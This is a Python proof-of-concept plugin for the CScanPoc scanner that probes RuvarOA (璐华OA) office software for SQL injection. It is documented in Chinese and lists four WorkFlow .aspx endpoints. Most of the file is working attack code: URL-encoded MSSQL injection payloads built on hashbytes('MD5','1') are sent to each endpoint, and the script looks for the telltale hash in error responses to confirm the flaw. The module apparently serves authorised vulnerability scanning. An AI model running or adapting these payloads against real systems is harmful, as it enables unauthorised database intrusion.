# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'RuvarOA_0003'  # 平台漏洞编号，留空
    name = '璐华通用企业版OA系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-06'  # 漏洞公布时间
    desc = '''
        璐华OA办公自动化系统（政府版）是广州市璐华计算机科技有限公司专门针对我国党政机关、事业单位开发，采用组件技术和Web技术相结合，基于Windows平台，构建在大型关系数据库管理系统基础上的，以行政办公为核心，以集成融通业务办公为目标，将网络与无线通讯等信息技术完美结合在一起设计而成的新型办公自动化应用系统。
        璐华通用企业版OA系统SQL注入漏洞：
        /WorkFlow/OfficeFileDownload.aspx?filename=1
        /WorkFlow/wf_work_stat_setting.aspx?template_id=
        /WorkFlow/wf_work_form_save.aspx?office_missive_id=
        /WorkFlow/wf_get_fields_approve.aspx?template_id=
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0104430'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'RuvarOA(璐华OA)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd0fa7429-982c-49e6-9624-1a1536668a27'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0--",
                "/WorkFlow/wf_work_stat_setting.aspx?template_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "/WorkFlow/wf_work_form_save.aspx?office_missive_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "/WorkFlow/wf_get_fields_approve.aspx?template_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
